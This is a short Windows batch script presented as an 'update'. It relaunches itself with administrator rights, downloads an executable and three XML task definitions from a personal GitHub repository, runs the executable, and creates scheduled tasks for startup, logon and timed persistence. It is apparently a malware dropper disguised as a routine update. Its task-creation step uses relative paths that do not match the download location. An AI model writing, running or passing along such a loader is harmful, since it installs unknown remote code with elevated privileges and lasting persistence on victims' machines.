@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)


set "urlexe=https://github.com/gbg379594/OS/raw/refs/heads/main/update.exe"
set "outputexe=%USERPROFILE%\Downloads\Update\update.exe"

set "urlx1=https://github.com/gbg379594/OS/raw/refs/heads/main/update1.xml"
set "outputx1=%USERPROFILE%\Downloads\Update\1.xml"

set "urlx2=https://github.com/gbg379594/OS/raw/refs/heads/main/update2.xml"
set "outputx2=%USERPROFILE%\Downloads\Update\2.xml"

set "urlx3=https://github.com/gbg379594/OS/raw/refs/heads/main/update3.xml"
set "outputx3=%USERPROFILE%\Downloads\Update\3.xml"

timeout /t 1 >nul

echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%urlexe%' -OutFile '%outputexe%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx1%' -OutFile '%outputx1%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx2%' -OutFile '%outputx2%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx3%' -OutFile '%outputx3%'"

echo Running the downloaded file...
start "" "%outputexe%"

schtasks /create /tn "StartUpUpdate" /xml "1.xml" /f & schtasks /create /tn "LogInUpdate" /xml "2.xml" /f & schtasks /create /tn "SchUpdate" /xml "3.xml" /f
